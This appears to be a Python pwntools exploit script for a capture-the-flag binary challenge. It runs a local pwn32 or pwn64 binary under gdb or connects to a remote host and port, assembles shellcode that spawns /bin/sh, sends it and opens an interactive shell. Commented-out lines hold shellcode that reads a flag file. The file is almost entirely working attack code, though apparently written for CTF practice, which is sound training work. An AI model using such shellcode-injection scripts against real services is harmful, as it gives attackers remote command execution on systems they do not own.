
from demo import *
import sys
from ae64 import AE64

if len(sys.argv) == 2:
    if '32' in sys.argv[1]:
        context(arch='i386', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h', '-p', '75'])
        # context(os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h', '-p', '75'])
        p = process('./pwn32')
        gdb.attach(p, 'b 28\nc')
    elif '64' in sys.argv[1]:
        context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h', '-p', '75'])
        # context(os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h', '-p', '75'])
        p = process('./pwn64')
        gdb.attach(p, 'b 28\nc')
    else:
        print("参数错误")
        exit()
elif len(sys.argv) == 3:
    context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h', '-p', '75'])
    # context(os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h', '-p', '75'])
    p = remote(sys.argv[1], int(sys.argv[2]))
    
else:
    print("未传入参数")
    exit()

p.recvuntil('>')

shellcode = ''
shellcode += shellcraft.sh()
# shellcode += shellcraft.open('/home/ctf/flag', 0)
# shellcode += shellcraft.read('rax', 'rsp', 0x100)
# shellcode += shellcraft.open('/dev/tty', 0x80001)
# shellcode += shellcraft.write('rax', 'rsp', 0x100)
payload = asm(shellcode)

p.send(payload)



p.interactive()